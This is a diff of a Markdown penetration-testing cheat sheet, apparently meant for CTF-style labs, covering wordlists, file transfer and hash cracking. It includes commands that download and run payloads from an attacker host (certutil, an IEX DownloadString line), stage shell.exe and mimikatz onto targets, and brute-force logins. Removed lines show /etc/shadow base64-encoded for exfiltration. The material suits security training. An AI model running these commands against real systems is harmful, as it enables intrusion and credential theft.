@@ -1,4 +1,4 @@
-# 📋 Quick Reference
+# Quick Reference
 
 Wordlists, file transfer methods, and hash cracking cheat sheet.
 
@@ -6,514 +6,287 @@ Wordlists, file transfer methods, and hash cracking cheat sheet.
 
 ## WORDLISTS
 
-### /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+### Directory brute forcing
+
+Go-to wordlist for gobuster, feroxbuster, ffuf — 220k entries
 
 ```bash
-Go-to for gobuster
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-wc -l directory-list-2.3-medium.txt
-220560 lines
-Used for: gobuster, feroxbuster, ffuf
-(Default go-to wordlist for directory brute forcing)
-```
-</details>
 
 ---
 
-### /usr/share/wordlists/rockyou.txt
+### Password cracking
+
+Standard password wordlist — 14 million entries
 
 ```bash
-Standard password list
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-wc -l rockyou.txt
-14344392 lines
-Used for: john, hashcat, hydra
-(Default password cracking wordlist)
-```
-</details>
 
 ---
 
-### /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+### Alternative directory list
+
+Catches paths that dirbuster misses — 30k entries
 
 ```bash
-Good alternative wordlist
+gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-wc -l raft-medium-directories.txt
-30000 lines
-Used for: directory brute force
-(Alternative to dirbuster, catches different paths)
-```
-</details>
 
 ---
 
-### /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+### Subdomain / vhost scanning
+
+Top subdomains for vhost discovery — 5k entries
 
 ```bash
-Subdomain / vhost scanning
+gobuster vhost -u http://domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+gobuster dns -d domain.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-wc -l subdomains-top1million-5000.txt
-4997 lines
-Used for: gobuster dns, ffuf vhost
-(Fast subdomain enumeration wordlist)
-```
-</details>
 
 ---
 
-### /usr/share/seclists/Usernames/Names/names.txt
+### Username enumeration
+
+Common first names as usernames — 10k entries
 
 ```bash
-Common first names
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
+hydra -L /usr/share/seclists/Usernames/Names/names.txt -p 'Password1' $IP ssh
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-wc -l names.txt
-10177 lines
-Used for: SMTP user enum, SSH brute force
-(Common first names as usernames)
-```
-</details>
 
 ---
 
-### /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
+### SNMP community strings
+
+Brute force SNMP community strings
 
 ```bash
-SNMP brute force
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $IP
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-Contents: public, private, community, manager, cisco...
-Used for: onesixtyone, snmpwalk
-(Common SNMP community strings)
-```
-</details>
 
 ---
 
-### /usr/share/seclists/
+### Install SecLists
+
+Massive collection of wordlists — Discovery, Fuzzing, Passwords, Usernames
 
 ```bash
-Install: apt install seclists
-```
-
-<details>
-<summary>Example Output</summary>
-
-```
+sudo apt install seclists -y
 ls /usr/share/seclists/
-Discovery/  Fuzzing/  Passwords/  Usernames/
-Web-Content/  DNS/  SNMP/  Payloads/
-(Massive collection - explore all subdirs)
 ```
-</details>
 
 ---
 
 ## FILE TRANSFER METHODS
 
-### python3 -m http.server 80
+### Host files on attacker (HTTP)
+
+Start a web server in your current directory — Most common transfer method
 
 ```bash
-Host files on attacker machine
-```
-
-<details>
-<summary>Example Output</summary>
-
-```
 python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80
-
-On target: wget http://ATTACKER_IP/linpeas.sh
-(Simplest file transfer, always works)
 ```
-</details>
 
 ---
 
-### wget http://ATTACKER_IP/file -O /tmp/file
+### Download to Linux target
+
+wget or curl — Try both if one isn't available
 
 ```bash
-Download to target
+wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
+curl http://$LHOST/chisel -o /tmp/chisel
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-wget http://10.10.14.2/linpeas.sh -O /tmp/linpeas.sh
---2026-02-24 10:00:00-- Connecting... connected.
-HTTP request sent, 200 OK
-Saved: '/tmp/linpeas.sh' [82321]
-```
-</details>
 
 ---
 
-### curl http://ATTACKER_IP/file -o /tmp/file
+### Download to Windows target (certutil)
+
+Built into every Windows version — Rarely blocked
 
 ```bash
-Alternative download
+certutil -urlcache -split -f http://$LHOST/shell.exe C:\Temp\shell.exe
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-curl http://10.10.14.2/chisel -o /tmp/chisel
-% Total  % Received
-100 8.2M  100 8.2M  0  0  52.1M  0
-(Use -o for output file, -O to keep original name)
-```
-</details>
 
 ---
 
-### certutil -urlcache -split -f http://ATTACKER_IP/file C:\Temp\file
+### Download to Windows target (PowerShell)
 
-```bash
-Windows built-in
-```
+Multiple methods — Try next one if blocked
 
-<details>
-<summary>Example Output</summary>
-
+```powershell
+Invoke-WebRequest -Uri http://$LHOST/shell.exe -OutFile C:\Temp\shell.exe
+(New-Object Net.WebClient).DownloadFile('http://$LHOST/shell.exe','C:\Temp\shell.exe')
+IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')
 ```
-certutil -urlcache -split -f http://10.10.14.2/nc.exe C:\Temp\nc.exe
-****  Online  ****
-CertUtil: -URLCache command completed.
-(Windows built-in, rarely blocked by AV)
-```
-</details>
 
 ---
 
-### Invoke-WebRequest -Uri http://ATTACKER_IP/file -OutFile C:\Temp\file
+### Host files on attacker (SMB)
+
+When HTTP is blocked on target — Works great for Windows
 
 ```bash
-Or: iwr -uri URL -o file
-```
-
-<details>
-<summary>Example Output</summary>
-
-```
-IWR -Uri http://10.10.14.2/shell.exe -OutFile C:\Temp\shell.exe
-OR: (New-Object Net.WebClient).DownloadFile('http://10.10.14.2/shell.exe','C:\Temp\shell.exe')
-(PowerShell - use if certutil is blocked)
-```
-</details>
-
----
-
-### impacket-smbserver share . -smb2support
-
-```bash
-Host SMB share
-```
-
-<details>
-<summary>Example Output</summary>
-
-```
+# On attacker:
 impacket-smbserver share . -smb2support
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8
-Impacket SMB server running...
-(Host files via SMB for Windows targets)
+
+# On Windows target:
+copy \\$LHOST\share\mimikatz.exe C:\Temp\
 ```
-</details>
 
 ---
 
-### copy \\ATTACKER_IP\share\file C:\Temp\file
+### Netcat file transfer
+
+Raw TCP — When nothing else works
 
 ```bash
-Copy from your SMB share
-```
+# On attacker (send):
+nc -nlvp 4444 < linpeas.sh
 
-<details>
-<summary>Example Output</summary>
-
+# On target (receive):
+nc $LHOST 4444 > /tmp/linpeas.sh
 ```
-copy \\10.10.14.2\share\mimikatz.exe C:\Temp\
-1 file(s) copied.
-(Fetch from SMB server, good when HTTP is blocked)
-```
-</details>
 
 ---
 
-### Attacker: nc -nlvp 4444 &lt; file
-Target: nc ATTACKER_IP 4444 &gt; file
+### Base64 encode/decode
+
+Copy-paste through the terminal — When all transfers are blocked
 
 ```bash
-If nothing else works
+# On attacker (encode):
+base64 -w 0 file.bin
+
+# On target (decode):
+echo 'BASE64STRING' | base64 -d > file.bin
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-Attacker: nc -nlvp 4444 < linpeas.sh
-Target:   nc 10.10.14.2 4444 > /tmp/linpeas.sh
-
-(Raw TCP transfer, no HTTP needed)
-(Works when wget/curl unavailable)
-```
-</details>
-
----
-
-### base64 file &gt; encoded.txt
-(copy text)
-echo '&lt;text&gt;' | base64 -d &gt; file
-
-```bash
-When all transfers are blocked
-```
-
-<details>
-<summary>Example Output</summary>
-
-```
-On target:
-base64 /etc/shadow
-cm9vdDokNiRhYmMx...
-
-On attacker:
-echo 'cm9vdDokNiRhYmMx...' | base64 -d > shadow
-(Exfiltrate files through copy-paste when no network)
-```
-</details>
 
 ---
 
 ## HASH CRACKING
 
-### hashid '&lt;hash&gt;'
-hash-identifier
+### Identify hash type
+
+Always identify before cracking — Determines hashcat mode
 
 ```bash
-First step before cracking
-```
-
-<details>
-<summary>Example Output</summary>
-
-```
 hashid '$6$rounds=5000$salt$hash'
-[+] SHA-512 Crypt
-
 hash-identifier
-Possible Hashs:
-[+] SHA-512 Crypt
-(Identify hash type before cracking)
+```
+
+<details>
+<summary>Common Hash Formats</summary>
+
+```
+MD5:        32 hex chars              → hashcat -m 0
+SHA1:       40 hex chars              → hashcat -m 100
+SHA256:     64 hex chars              → hashcat -m 1400
+SHA512:     128 hex chars             → hashcat -m 1800 (if $6$ prefix)
+NTLM:       32 hex chars (no salt)    → hashcat -m 1000
+NTLMv2:     user::domain:challenge... → hashcat -m 5600
+bcrypt:     $2a$ or $2y$ prefix       → hashcat -m 3200
+Kerberoast: $krb5tgs$23$*...          → hashcat -m 13100
+AS-REP:     $krb5asrep$23$...         → hashcat -m 18200
+md5crypt:   $1$ prefix                → hashcat -m 500
+sha512crypt:$6$ prefix                → hashcat -m 1800
 ```
 </details>
 
 ---
 
-### john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+### John the Ripper
+
+Auto-detects hash type — Good general purpose cracker
 
 ```bash
-General purpose cracker
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-john --wordlist=rockyou.txt hash.txt
-Loaded 1 password hash (sha512crypt)
-Press 'q' to abort
-admin123  (admin)
-Session completed
-(john auto-detects hash type)
-```
-</details>
 
 ---
 
-### hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+### Hashcat — MD5
+
+Mode 0 — Fastest hash to crack
 
 ```bash
--m 0 = MD5
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-hashcat -m 0 hash.txt rockyou.txt
-Hashcat v6.2.6
-$HEX[...]:password123
-Session: hashcat
-Status: Cracked
-(MD5 = mode 0, fastest to crack)
-```
-</details>
 
 ---
 
-### hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
+### Hashcat — SHA256
+
+Mode 1400
 
 ```bash
--m 1400 = SHA256
+hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-hashcat -m 1400 hash.txt rockyou.txt
-SHA-256 hash cracked:
-abc123def...:Summer2024
-(SHA-256 = mode 1400)
-```
-</details>
 
 ---
 
-### hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
+### Hashcat — NTLM
+
+Mode 1000 — Windows local password hashes, very fast
 
 ```bash
--m 1000 = NTLM
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-hashcat -m 1000 hash.txt rockyou.txt
-NTLM hash cracked:
-31d6cfe0d16ae931b...:Password1
-(NTLM = mode 1000, very fast to crack)
-```
-</details>
 
 ---
 
-### hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+### Hashcat — NTLMv2
+
+Mode 5600 — Captured from Responder or network sniffing
 
 ```bash
--m 5600 = NTLMv2
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-hashcat -m 5600 hash.txt rockyou.txt
-NTLMv2 hash cracked:
-john::CORP:abc123...:Welcome2024!
-(NTLMv2 = mode 5600, captured from Responder)
-```
-</details>
 
 ---
 
-### hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
+### Hashcat — bcrypt
+
+Mode 3200 — Very slow, use rules instead of full wordlist
 
 ```bash
--m 3200 = bcrypt (slow)
+hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-hashcat -m 3200 hash.txt rockyou.txt
-bcrypt hash cracked:
-$2y$10$abc...:monkey123
-(bcrypt = mode 3200, SLOW - use rules not full wordlist)
-```
-</details>
 
 ---
 
-### hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+### Hashcat — Kerberoast (TGS-REP)
+
+Mode 13100 — Cracking Kerberoasted service account hashes
 
 ```bash
--m 13100 = TGS-REP
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-hashcat -m 13100 hash.txt rockyou.txt
-Kerberoast TGS hash cracked:
-$krb5tgs$23$*svc_sql*...:SQLServiceP@ss!
-(Kerberoast = mode 13100)
-```
-</details>
 
 ---
 
-### hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+### Hashcat — AS-REP Roast
+
+Mode 18200 — Cracking AS-REP hashes from accounts without pre-auth
 
 ```bash
--m 18200 = AS-REP
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-hashcat -m 18200 hash.txt rockyou.txt
-AS-REP hash cracked:
-$krb5asrep$23$svc_backup...:Backup2024!
-(AS-REP = mode 18200)
-```
-</details>
 
 ---
 
-### https://crackstation.net/
+### Online hash lookup
+
+Instant results for common hashes — Only for non-sensitive/CTF hashes
 
 ```bash
-Quick check for common hashes
+# Paste hash at:
+# https://crackstation.net/
+# https://hashes.com/en/decrypt/hash
 ```
-
-<details>
-<summary>Example Output</summary>
-
-```
-Paste hash into https://crackstation.net/
-Result: MD5 abc123... = 'password'
-(Online rainbow tables, instant for common hashes)
-(Only for non-sensitive/CTF hashes)
-```
-</details>
 
 ---
